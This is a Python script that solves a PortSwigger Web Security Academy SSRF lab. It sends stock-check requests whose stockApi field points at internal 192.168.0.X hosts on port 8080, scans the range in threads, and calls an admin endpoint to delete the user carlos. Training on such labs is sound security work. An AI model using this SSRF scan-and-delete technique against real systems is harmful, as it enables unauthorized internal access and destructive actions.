#!/usr/bin/env python

'''
This lab has a stock check feature which fetches data from an internal system.
To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.

Lab Link: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system
'''

import requests
import concurrent.futures


lab_id = '0a34008703222db683992a47002c00a0' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/product/stock"

# Look for the admin endpoint in the 192.168.0.X/24 subnet
def send_post(octect: int) -> int:
    data = {'stockApi': f'http://192.168.0.{str(octect)}:8080/admin/delete?username=carlos'}
    r = requests.post(uri, data=data, allow_redirects=False)
    return octect, r.status_code
        

with concurrent.futures.ThreadPoolExecutor() as executor:
    for result in executor.map(send_post,[i for i in range(1,255)] ):
        if result[1] == 302:
            print(f"Found admin endpoint at ip address: 192.168.0.{str(result[0])}")